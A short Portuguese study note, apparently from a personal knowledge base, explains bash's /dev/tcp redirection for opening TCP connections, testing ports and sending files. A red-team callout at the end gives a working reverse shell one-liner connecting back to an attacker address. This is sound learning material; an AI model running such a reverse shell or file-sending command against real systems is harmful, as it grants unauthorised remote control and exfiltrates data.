Não se trata de um arquivo ou diretório, mas sim de um comando especial interpretado por um  [[7. Shell]] do tipo `bash`. Usado para abrir conexões [[5. TCP]] pela linha de comando e tratá-las como arquivos(ou streams), permitindo o uso de **output/input redirections**. Exemplo:

```shell
$ echo "hello world" > /dev/tcp/192.168.0.200/443
```

O comando acima redireciona a saída do `echo` para uma conexão aberta para `192.168.0.200:443`. 

Com ele é possível também testar conexões, fazendo apenas `>/dev/tcp/<host>/<port>` e até mesmo realizar transferência de arquivos como `cat file.txt > /dev/tcp/<host>/<port>`

Note que este comando especial só é interpretado de tal forma sob um contexto de redirecionamento, ou seja, tentar executar qualquer comando em `/dev/tcp` não funcionará, tipo `cat /dev/tcp`, `ls /dev/tcp` etc. **Não se trata de um arquivo ou diretório real**.


> [!redteam] Reverse Shell com `/dev/tcp`
> Mesmo sendo um comando especial bem simples, ainda assim é possível realizar um [[5. Reverse Shell]], fazendo com que um host alvo se conecte ao atacante enviando seu shell. Para isso, basta fazer uma manipulação interessante de streams:
> ```shell
> $ bash -i >& /dev/tcp/192.168.0.19/4444 0>&1
> ```
